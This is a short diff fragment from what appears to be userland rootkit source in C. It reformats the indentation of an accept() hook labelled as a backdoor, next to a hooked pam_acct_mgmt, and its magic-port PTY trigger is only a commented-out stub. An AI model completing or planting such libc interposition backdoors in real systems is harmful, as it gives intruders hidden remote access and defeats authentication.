@@ -58,16 +58,16 @@ int pam_acct_mgmt(pam_handle_t *pamh, int flags)
 /* accept() backdoor. */
 int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
 {
-	unsigned short int port;
-	int retval;
-	
-	retval    = (int) libcalls[ACCEPT](sockfd, addr, addrlen);
-	port      = ntohs(((struct sockaddr_in *) addr)->sin_port);
+    unsigned short int port;
+    int retval;
+
+    retval = (int) libcalls[ACCEPT](sockfd, addr, addrlen);
+    port   = ntohs(((struct sockaddr_in *) addr)->sin_port);
 
 /*
-	if(port == MAGIC_PORT)
-		** Open a PTY? **
+    if(port == MAGIC_PORT)
+        ** Open a PTY? **
 */
 
-	return retval;
+    return retval;
 }
